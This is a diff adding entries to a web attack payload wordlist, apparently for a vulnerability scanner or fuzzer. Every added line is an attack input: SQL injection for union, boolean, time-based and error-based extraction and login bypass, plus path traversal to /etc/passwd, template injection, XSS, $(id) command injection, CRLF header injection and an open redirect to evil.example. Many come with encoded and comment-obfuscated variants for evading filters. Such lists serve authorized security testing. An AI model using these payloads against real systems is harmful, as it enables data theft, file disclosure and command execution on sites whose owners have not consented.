@@ -78,3 +78,163 @@ sqli_1
 ' OR 1=1 --%0a1
 ' UNION SELECT NULL --?v=2
 ' UNION SELECT NULL --&v=2
+' UNION SELECT NULL,NULL,NULL --
+%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--
+%2527%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL%2520--
+'/**/UNION/**/SELECT/**/NULL,NULL,NULL/**/--
+' UNION SELECT NULL,NULL,NULL --?aurose=1
+' UNION SELECT NULL,NULL,NULL --&aurose=1
+' UNION SELECT @@version,NULL,NULL --
+%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL%20--
+%2527%2520UNION%2520SELECT%2520%2540%2540version%252CNULL%252CNULL%2520--
+'/**/UNION/**/SELECT/**/@@version,NULL,NULL/**/--
+' UNION SELECT @@VERSION,NULL,NULL --
+' UNION SELECT @@version,NULL,NULL --?aurose=1
+' UNION SELECT @@version,NULL,NULL --&aurose=1
+1' OR '1'='1' #
+1%27%20OR%20%271%27%3D%271%27%20%23
+1%2527%2520OR%2520%25271%2527%253D%25271%2527%2520%2523
+1'/**/OR/**/'1'='1'/**/#
+1' OR '1'%3d'1' #
+1' OR '1'='1' #?aurose=1
+1' OR '1'='1' #&aurose=1
+' AND SLEEP(3)--
+%27%20AND%20SLEEP%283%29--
+%2527%2520AND%2520SLEEP%25283%2529--
+'/**/AND/**/SLEEP(3)--
+' AND SLEEP(3)--?aurose=1
+' AND SLEEP(3)--&aurose=1
+1);WAITFOR DELAY '0:0:3'--
+1%29%3BWAITFOR%20DELAY%20%270%3A0%3A3%27--
+1%2529%253BWAITFOR%2520DELAY%2520%25270%253A0%253A3%2527--
+1);WAITFOR/**/DELAY/**/'0:0:3'--
+1);WAITFOR DELAY '0:0:3'--?aurose=1
+1);WAITFOR DELAY '0:0:3'--&aurose=1
+' OR IF(ASCII(SUBSTRING(USER(),1,1))>64,SLEEP(2),0)--
+%27%20OR%20IF%28ASCII%28SUBSTRING%28USER%28%29%2C1%2C1%29%29%3E64%2CSLEEP%282%29%2C0%29--
+%2527%2520OR%2520IF%2528ASCII%2528SUBSTRING%2528USER%2528%2529%252C1%252C1%2529%2529%253E64%252CSLEEP%25282%2529%252C0%2529--
+'/**/OR/**/IF(ASCII(SUBSTRING(USER(),1,1))>64,SLEEP(2),0)--
+' OR IF(ASCII(SUBSTRING(USER(),1,1))>64,SLEEP(2),0)--?aurose=1
+' OR IF(ASCII(SUBSTRING(USER(),1,1))>64,SLEEP(2),0)--&aurose=1
+' OR EXISTS(SELECT 1 FROM information_schema.tables)--
+%27%20OR%20EXISTS%28SELECT%201%20FROM%20information_schema.tables%29--
+%2527%2520OR%2520EXISTS%2528SELECT%25201%2520FROM%2520information_schema.tables%2529--
+'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/information_schema.tables)--
+' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES)--
+' OR EXISTS(SELECT 1 FROM information_schema.tables)--?aurose=1
+' OR EXISTS(SELECT 1 FROM information_schema.tables)--&aurose=1
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--
+%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%29--
+%2527%2520AND%2520EXTRACTVALUE%25281%252CCONCAT%25280x7e%252Cversion%2528%2529%252C0x7e%2529%2529--
+'/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0X7E,VERSION(),0X7E))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--?aurose=1
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--&aurose=1
+') OR ('1'='1
+%27%29%20OR%20%28%271%27%3D%271
+%2527%2529%2520OR%2520%2528%25271%2527%253D%25271
+')/**/OR/**/('1'='1
+') OR ('1'%3d'1
+') OR ('1'='1?aurose=1
+') OR ('1'='1&aurose=1
+admin'/*
+admin%27%2F%2A
+admin%2527%252F%252A
+ADMIN'/*
+admin'/*?aurose=1
+admin'/*&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+' UNION SELECT NULL,NULL,NULL --::var0
+%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--::v0
+/sqli/probe/0
+' UNION SELECT @@version,NULL,NULL --::var1
+%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL%20--::v1
+/sqli/probe/1
+1' OR '1'='1' #::var2
+1%27%20OR%20%271%27%3D%271%27%20%23::v2
+/sqli/probe/2
+' AND SLEEP(3)--::var3
+%27%20AND%20SLEEP%283%29--::v3
+/sqli/probe/3
+1);WAITFOR DELAY '0:0:3'--::var4
+1%29%3BWAITFOR%20DELAY%20%270%3A0%3A3%27--::v4
+/sqli/probe/4
+' OR IF(ASCII(SUBSTRING(USER(),1,1))>64,SLEEP(2),0)--::var5
+%27%20OR%20IF%28ASCII%28SUBSTRING%28USER%28%29%2C1%2C1%29%29%3E64%2CSLEEP%282%29%2C0%29--::v5
+/sqli/probe/5
